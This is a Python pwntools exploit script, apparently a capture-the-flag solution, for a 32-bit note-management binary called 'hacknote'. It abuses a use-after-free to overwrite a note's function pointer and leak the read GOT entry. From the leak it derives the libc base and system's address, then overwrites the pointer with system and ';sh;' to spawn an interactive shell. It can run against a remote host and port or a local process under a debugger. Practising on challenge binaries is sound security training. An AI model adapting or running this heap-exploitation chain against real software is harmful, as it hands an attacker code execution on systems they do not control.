#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

gdb_bool = True
#gdb_bool = False

puts_call = 0x80484D0
read_offset = 0xD41C0
def addNote(size,contents):
    r.sendline("1")
    r.recvuntil("size :")
    r.sendline(str(size))
    r.recvuntil("Content :")
    r.sendline(contents)
    r.recvuntil("choice :")

def deleteNote(index):
    r.sendline("2")
    r.recvuntil("Index :")
    r.sendline(str(index))
    r.recvuntil("choice :")

def printNote(index):
    r.sendline("3")
    r.recvuntil("Index :")
    r.sendline(str(index))
    #r.recvuntil("choice :")



def exploit(r):

    r.recvuntil("choice :")
    addNote(20,"A"*19)
    addNote(20,"B"*19)
    deleteNote(0)
    deleteNote(1)
    buf =""
    buf += p32(puts_call)
    buf += "BBBB"
    buf += "pwned"
    #addNote(len(buf),buf)
    addNote(8,p32(0x804862B)+p32(0x804A00C))
    printNote(0)
    #print r.recvn(4)
    read_got_leak = u32(r.recvn(4))
    base_libc = read_got_leak - read_offset
    system = base_libc + 0x3A940
    print("Address of system: ", hex(system))
    deleteNote(2)

    addNote(8,p32(system)+";sh;")
    
    #printNote(0)
    r.interactive()
    return


if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    
    binary_name = "./hacknote"        #put binary name here
    e = ELF(binary_name)
    libc = ELF("libc_32.so.6")

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(binary_name,env={"LD_PRELOAD" : "./libc_32.so.6"})
        print util.proc.pidof(r)
        gdb_cmd = [
            "b *0x804893D",
            "c"


        ]
        if(gdb_bool):
            gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)

